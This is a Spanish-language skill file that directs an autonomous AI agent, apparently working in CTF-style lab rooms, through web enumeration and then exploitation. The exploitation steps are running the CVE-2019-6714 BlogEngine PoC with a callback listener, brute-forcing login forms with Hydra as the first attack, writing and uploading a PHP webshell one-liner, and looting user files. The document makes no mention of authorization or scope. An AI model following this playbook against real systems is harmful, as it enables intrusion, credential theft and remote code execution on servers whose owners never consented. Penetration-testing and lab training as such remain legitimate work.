---
name: web-recon-master
description: Enumeración web con HTTP/HTTPS antes de probar credenciales: código fuente, robots.txt, gobuster con extensiones y .git expuesto.
---

# Enumeración web antes de atacar

## La regla

**Si el escaneo muestra HTTP/HTTPS —80, 443 o cualquier otro puerto, incluido un
panel de WordPress, un IIS de Active Directory o una API— ejecuta este checklist
ANTES de probar credenciales, lanzar sqlmap o buscar exploits.**

Un formulario de login no es una invitación a probar contraseñas: es un endpoint
que todavía no entiendes. En una auditoría real el camino casi nunca es
`admin/admin`: es un comentario en el HTML, un `robots.txt` que nombra el
directorio de backups, un `.git` expuesto con el código de la aplicación, o una
API cuya documentación vive en `/swagger.json`. Todo eso se lee en segundos; una
wordlist contra SSH o un formulario tarda minutos u horas y no produce hechos.

Medido en el run `run_4e8779f4dc6a46fd8f42608056858cfb` (2026-10-20): el agente
encontró `/admin`, probó dos contraseñas a mano, lanzó SQLi a ciegas, hizo tres
barridos de `rockyou.txt` contra SSH (≈130 s cada uno) y murió en
`budget_exceeded` con **0 hallazgos** — sin haber leído nunca `/robots.txt` ni
los comentarios de la página principal.

## Checklist (en este orden, sin saltarse pasos)

### 1. La raíz, a mano: el código fuente es la primera pista

```
nexus.web.request(url="http://<host>/")
nexus.web.request(url="https://<host>/")            # si 443 está abierto
```

Lee `body_preview`, `headers`, `status` y, sobre todo, **el HTML en bruto**. Busca:

- comentarios `<!-- ... -->`: usuarios, TODOs, rutas ocultas, contraseñas de
  ejemplo, rutas de backup;
- `<meta name="generator">`, rutas de `/wp-content/`, `/wp-includes/`,
  `/_next/`, `/api/`, `X-Powered-By`, `Server`, `X-AspNet-Version`;
- enlaces y formularios: a dónde envían (`action=`), qué parámetros aceptan;
- ficheros `.js` referenciados: suelen contener rutas de API y claves de front;
- mensajes de error visibles (stack trace, SQL, versión del framework).

Si la respuesta viene truncada (`preview_truncated: true`) o es un binario:

```
nexus.web.request(url="http://<host>/", save_path="recon/root.html")
nexus.workspace.read(path="recon/root.html")
nexus.workspace.search(query="<patrón>")            # busca en todo el workspace
```

Registra lo que encuentres como `hint` o `endpoint` con
`nexus.knowledge.record_fact`: un comentario con un usuario es un hecho, no una
frase del razonamiento.

### 2. Los ficheros que todo el mundo olvida

```
nexus.web.request(url="http://<host>/robots.txt")
nexus.web.request(url="http://<host>/sitemap.xml")
nexus.web.request(url="http://<host>/.well-known/security.txt")
```

- `robots.txt` con `Disallow:` es un índice de rutas que el dueño no quería
  publicar. Cada entrada `Disallow` es una ruta que hay que visitar.
- `sitemap.xml` lista páginas que no aparecen en el menú (cada `<loc>`).
- `security.txt` da contacto, política y a veces URL internas.

**Regla de oro (no negociable): leer el índice no es seguirlo.** En cuanto
obtengas un `robots.txt` o un `sitemap.xml`, extrae **TODAS** las rutas
(`Disallow:`, `Allow:` y cada `<loc>`) y haz un `GET` a cada una **inmediatamente**,
antes de cerrar la rama o cambiar de servicio:

```
nexus.web.request(url="http://<host>/<ruta-del-indice>")
nexus.web.request(url="http://<host>/backup.zip", save_path="recon/backup.zip")
nexus.workspace.read(path="recon/backup.zip")
```

- Si la ruta es un backup, un `.zip`, un `.tar.gz`, un `.env`, un `.txt` o una
  clave: descárgala con `save_path` y **léela** con `nexus.workspace.read`
  (`nexus.workspace.search` para buscar `password`, `key`, `BEGIN`).
- Cada ruta visitada se registra con `nexus.knowledge.record_fact`
  (`fact_type="endpoint"`), sobre todo las que devuelven un backup o una clave.
- Un índice leído y no seguido es un fallo de metodología, no un callejón sin
  salida: está medido (`/tmp/bruteit-run-v2.ndjson`, 2026-10-20) que el agente
  pidió `robots.txt`, no visitó ninguna de sus rutas y cerró la rama con un
  `barrier` en el turno siguiente. El bucle inyecta esta orden mientras queden
  rutas del índice sin visitar (`react.robots_paths`).

Prueba también las variantes que delatan un CMS o un framework: `/wp-login.php`,
`/administrator/`, `/.env`, `/config.php.bak`, `/swagger.json`, `/api/`,
`/graphql`. Un 403 no es un hallazgo (Apache devuelve 403 en `.htaccess`,
`.htpasswd`, `.hta` y `server-status` por defecto): es ruido.

### 3. Gobuster con extensiones, no un barrido de directorios a medias

```
nexus.recon.gobuster(
    mode="dir",
    target="http://<host>",
    wordlist="/usr/share/dirb/wordlists/common.txt",
    extensions=["php", "html", "txt", "bak", "zip"],
)
```

- `extensions` es un argumento de la tool: el handler construye `-x
  php,html,txt,bak,zip`. Pasar `-x` dentro de `flags` se descarta sin avisar.
- Sin extensiones solo ves directorios: `/admin` sí, `admin.php`, `backup.zip` o
  `config.php.bak` no. Esos ficheros son justo donde están las pistas.
- Si aparece un directorio, **repite el barrido dentro de él** (`target=
  "http://<host>/<dir>"`): un `/admin/` puede tener su propio `login.php`,
  `config.php` o `upload.php`.
- Alternativa/complemento: `nexus.web.ffuf(url="http://<host>/FUZZ",
  wordlist="/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt")`
  para vhosts, parámetros o listas más grandes.
- Lee los códigos: `200` y `301/302` son rutas reales; `401/403` existen pero
  están protegidas (anótalas, no las fuerces); `500` suele ser un endpoint que
  rompe con la petición equivocada.

### 4. `.git` expuesto (código fuente de la aplicación)

```
nexus.web.request(url="http://<host>/.git/HEAD")
nexus.web.git_dump(url="http://<host>/.git")
```

- Si `/.git/HEAD` responde `200` con `ref: refs/heads/...`, el repositorio está
  publicado: `nexus.web.git_dump` recupera HEAD y objetos sueltos en un artefacto
  bare (sin checkout, sin hooks).
- Si responde `404`, el `.git` no está expuesto. El `git_dump` devuelve
  `status: incomplete` / `HTTPError`: **eso es un resultado negativo, no un
  fallo que se reintente**. Anótalo y sigue con el checklist.
- El artefacto se lee con `nexus.workspace.read(path="artifact:<id>")`; busca
  ahí credenciales, cadenas de conexión y rutas de administración.

Variables: `/.git/config`, `/.svn/entries`, `/.DS_Store`, `/.env`,
`/backup.zip`, `/www.zip`, `/app.py.bak`. Un `.env` o un backup con código
fuente cierra más salas que cualquier wordlist.

### 5. Tecnología, versión y vulnerabilidades conocidas

```
nexus.recon.whatweb(targets=["http://<host>"])
nexus.recon.httpx(targets=["http://<host>"], tech_detect=True)
nexus.recon.nikto(target="http://<host>")
nexus.exploit.searchsploit(query="<producto> <versión>")
```

Con el CMS y la versión, `searchsploit` traduce el fingerprint a
vulnerabilidades. Sin esa pareja, cualquier exploit es adivinación. Si es
WordPress hay herramientas propias: `nexus.web.wp_enum` para usuarios, plugins y
temas antes de tocar el login.

**Regla de oro (CMS con versión vulnerable).** Si identificas un CMS
(BlogEngine, WordPress, Joomla) con una versión vulnerable, usa
`nexus.exploit.find_and_prepare` con el CVE o el nombre del CMS. Lee el código
del exploit, adapta el payload (p. ej. una webshell ASPX o PHP) y súbelo con
`nexus.web.upload`.

```
nexus.exploit.find_and_prepare(cve="CVE-2019-6714")
# -> {path: "loot/exploits/46353-....cs", code: "# Exploit Title...", language: "csharp"}
```

El handler copia el PoC al workspace (`loot/exploits/`) y devuelve su código:
no basta con saber que el exploit existe. El flujo completo es **buscar → leer →
adaptar → subir → accionar → verificar** (`access`/`loot`), no solo buscar.

**Regla de oro (ruta del PoC).** `find_and_prepare` devuelve `{"path":
"loot/exploits/46353-....cs", "code": "..."}`: usa el campo **`path`** tal cual
como `exploit_path` en `compile_and_upload` / `workspace.read`. **NO** uses el
EDB-ID (`46353`) ni el nombre del CVE (`CVE-2019-6714`): no son rutas y el
archivo no se encuentra (run V13, HackPark, iteración 52: ocho turnos buscando
el archivo que ya estaba en `loot/exploits/`).

**Regla de oro (PoC en mano).** Si `find_and_prepare` devuelve un PoC, **LEE el
código** y sigue su `next_steps`: el tipo de archivo decide el vector, y
equivocarlo gasta el turno en una subida que el objetivo no ejecuta.

- **`.ascx`**, o un **`.cs` con `<%@ Control %>`** (BlogEngine, `CVE-2019-6714`):
  es un **tema/widget ASP.NET**, no un ejecutable. No lo subas como `.cs` a un
  formulario cualquiera: entra al panel de admin con una sesión válida
  (`csrf_mode=true`, `session_ref` si ya la tienes), súbelo con
  `nexus.exploit.compile_and_upload(exploit_path="<el path exacto del
  resultado>", target_url="http://<host>/admin/app_themes.aspx",
  target_filename="PostView.ascx", session_ref=..., csrf_mode=true)` y actívalo
  navegando a `/themes/<nombre-del-tema>/` o a la ruta donde el CMS sirva el
  control. La prueba de ejecución es la salida de `id` (el `session_ref` que
  devuelve la tool), no un `200` en la subida.
- **`.py`**: ejecútalo con `nexus.shell.exec(command="python3 /ruta/al/script.py")`
  (lee antes los argumentos que espera: host/puerto de callback).
- **`.exe` o binario**: súbelo con `nexus.web.upload` o
  `nexus.post.smb_upload` y ejecútalo con `nexus.shell.exec`,
  `nexus.post.ssh_exec` o `nexus.win.winrm_exec`.
- **`.cs` sin markup ASP.NET**: compílalo con `mcs`/`csc` (lo hace
  `nexus.exploit.compile_and_upload`) y sube el `.exe`; el `.cs` suelto no se
  ejecuta en el objetivo.

Si el PoC trae `ATTACKER_IP`/`LHOST`/`LPORT`, pásale tu listener con
`callback_host`/`callback_port` a `compile_and_upload`: la sustitución se hace
sobre una copia en `loot/exploits/prepared/`, nunca sobre el original.

### 6. Entiende cada endpoint con entrada antes de atacarlo

- Un formulario de login: ¿qué parámetros? ¿hay CSRF? ¿responde distinto con
  usuario inexistente que con contraseña mala (enumeración de usuarios)? Eso se
  lee en una petición; atacarlo tiene una regla propia (abajo).

#### Regla de login web (no negociable)

Ante un **formulario de login** (`POST` con usuario y contraseña) tienes
**prohibido** probar inyecciones SQL manuales con `nexus.web.request` —
`admin' or '1'='1`, `' OR 1=1-- -`, etc.— como primer paso: es adivinar y quema
los turnos que el login necesita. El primer intento es **siempre**
`nexus.cred.bruteforce` con `service="http-post-form"` (o `http-get-form` si el
formulario viaja por GET) y los tres campos que Hydra exige:

```
nexus.cred.bruteforce(
    target="<host>",
    service="http-post-form",
    port=80,
    username="admin",                    # el usuario del panel o el enumerado
    password_file="locks.txt",           # la lista; rockyou.txt si no hay pista
    form_url="/admin/index.php",         # la ruta del POST, no el host
    form_params="user=^USER^&pass=^PASS^&submit=Login",
    failure_string="Invalid username or password",
    csrf_mode=True,                      # SOLO si el form valida tokens ocultos
)
```

- **Formularios con CSRF/ASP.NET:** si el HTML trae `<input type="hidden">`
  con `__VIEWSTATE`, `__EVENTVALIDATION`, `__RequestVerificationToken`,
  `authenticity_token`, `_token` o similar, Hydra no puede refrescarlos y cada
  POST se rechaza antes de probar la contraseña. Pasa `csrf_mode=true`: el motor
  hace un GET por intento, extrae los tokens ocultos, reutiliza la cookie de
  sesión y recién entonces prueba la credencial. Para una petición suelta,
  `nexus.web.request` acepta el mismo `csrf_mode=true` (y `csrf_form_url` si la
  página del formulario no es la URL del POST).

- `failure_string` es lo que devuelve el panel cuando falla **una** credencial
  (no la página de login entera): sin ese texto Hydra no distingue el éxito del
  fracaso y el barrido no prueba nada.
- Es la **excepción documentada** a la regla de "la fuerza bruta es el último
  recurso": en un login encontrado, el barrido del formulario *es* el primer
  intento, porque el SQLi manual a mano no es ni una prueba de credenciales ni
  un SQLi real. Una vez lanzado, se aplica el límite de siempre: un intento (el
  handler ya acota los intentos y el tiempo) y, si no da credenciales, se pasa
  al paso 7.
- **Solo si Hydra falla, da error o no encuentra credenciales** puedes volver a
  SQLi —con `nexus.web.sqlmap(url=..., data="user=admin&pass=x")`, **una**
  inyección por parámetro, nunca a mano con `nexus.web.request`— o a los
  backups del paso 7.
- Una API: pide `/swagger.json`, `/openapi.json`, `/api/docs`; prueba métodos
  (`OPTIONS`) y rutas sin autenticar.
- Un CMS: `nexus.web.wp_enum`, versiones de plugins y `searchsploit`.

#### Regla de subida de archivos (no negociable)

Si entras a un **panel de administración con un formulario de subida de
archivos** (`<input type="file">`), el paso siguiente **no** es seguir buscando
contraseñas: es intentar RCE con una webshell. Carga la skill
`web-upload-webshell` (`nexus.skill.load(name="web-upload-webshell")`) y hazlo
en cuatro pasos:

1. lee el HTML del formulario y anota el `name` del `<input type="file">`, el
   `action`/`method`, los `<input type="hidden">` y el botón de envío;
2. escribe la webshell en el workspace con `nexus.shell.exec` (p. ej.
   `printf '%s\n' '<?php system($_GET["c"]); ?>' > shell.phtml`);
3. súbela con `nexus.web.upload(url="http://<host>/<panel>/",
   upload="shell.phtml", method="POST")` (o con `curl -F` desde
   `nexus.shell.exec` si el formulario exige campos extra y redirects);
4. ejecútala con `nexus.web.request(url="http://<host>/uploads/shell.phtml?c=id")`
   y **loot primero**: `cat /home/*/user.txt` antes de escalar.

Si el filtro rechaza `.php`, repite solo la extensión (`.phtml`, `.php5`, `.pHp`)
antes de cambiar de vector. Una subida con `200` no prueba nada: la prueba es la
salida de `id` de la webshell.

### 7. Checklist de vectores: si el login no cede, cambia de vector

Un login que no cede no cierra la rama: cierra *ese* vector. Antes de pasar al
siguiente servicio, recorre esta lista:

- **Backups y fuente**: `/index.php.bak`, `/config.php.bak`, `/backup.zip`,
  `/www.zip`, `/app.tar.gz`, `/.env`. Descárgalos con `save_path` y léelos con
  `nexus.workspace.read` (`nexus.workspace.search` para `password`, `key`,
  `BEGIN`): un backup suele ser el acceso que el login negaba.
- **El índice, completo**: ¿quedan rutas del `robots.txt`/`sitemap.xml` sin
  visitar (`Disallow:`, `Allow:`, cada `<loc>`)? Pídelas todas antes de
  documentar el callejón.
- **El CMS**: `nexus.web.wp_enum` para usuarios, plugins y temas, y
  `nexus.exploit.searchsploit` con el plugin y su versión. Un plugin vulnerable
  vale más que otra wordlist.
- **Otro parámetro o método**: el mismo endpoint con otro parámetro, `OPTIONS`,
  o la API que sirve el front (`/api/`, `/graphql`, `/swagger.json`).
- **Subida de archivos**: si el panel (autenticado o no) tiene un formulario de
  subida, una webshell es RCE directo; sigue la regla de subida de arriba antes
  de dar el vector por agotado.

Dos intentos del mismo vector sin hechos nuevos son el límite: el tercero es
presupuesto perdido. Cuando el puerto 80/443 está agotado, documenta el
`barrier` y pivota:

```
nexus.knowledge.record_fact(
    fact_type="barrier",
    key="<host>:<puerto>",
    value={"reason": "web agotada: login sin credenciales, backups e índice revisados"},
)
```

Y pasa al siguiente servicio del mapa (`nexus.post.ssh_exec`, `nexus.recon.ftp`,
SMB): la sala no se cierra por insistir en el puerto 80.

## La fuerza bruta es el último recurso

**No uses `nexus.cred.bruteforce`, `nexus.web.wp_bruteforce` ni
`nexus.post.pivot_bruteforce` hasta que se cumplan las dos condiciones:**

1. has completado los pasos 1-6 sobre el servicio, y
2. tienes una pista concreta de credenciales débiles: un usuario por defecto
   documentado, una credencial filtrada en el código fuente / `.git` / un
   fichero descargado, un hash crackeable, o un panel que anuncia una política
   de contraseñas trivial.

Sin pista, la fuerza bruta no es una técnica: es una apuesta que consume el
presupuesto del engagement sin producir hechos. Registra el callejón sin salida
y cambia de rama:

```
nexus.knowledge.record_fact(
    fact_type="barrier",
    key="<host>:<puerto>",
    value={"reason": "credenciales débiles no justificadas: enumeración sin pistas de usuario/contraseña"},
)
```

Si la pista existe, prueba primero las credenciales conocidas (usuario del
comentario, contraseña del `.env`, par usuario=contraseña) con `nexus.web.request`
o `nexus.post.ssh_exec`; la wordlist es el último escalón, no el primero.

## Señales de que estás rompiendo la metodología

- Llevas 3+ llamadas a la misma tool sin hechos nuevos → para y vuelve al paso 1.
- Estás probando contraseñas y todavía no has pedido `/robots.txt`.
- Has leído `robots.txt`/`sitemap.xml` y no has visitado las rutas que lista:
  cierra esa deuda antes de documentar cualquier `barrier`.
- Estás atacando un panel de login sin haber mirado su HTML (a veces el propio
  formulario dice qué usuario existe o qué motor usa).
- Estás barriendo `rockyou.txt` contra un servicio que no has enumerado.
- Estás repitiendo el mismo intento con el mismo comando: cambia de parámetro,
  de transporte o de herramienta.

## Cierre

- Cada ruta, usuario o tecnología que encuentres se registra con
  `nexus.knowledge.record_fact` (`endpoint`, `hint`, `service`, `credential`).
- Un barrido sin resultados también es un hecho (`barrier`): evita que el
  siguiente turno repita lo mismo.
- El objetivo se cierra con evidencia de este run, no con lo que la herramienta
  "debería" haber encontrado.
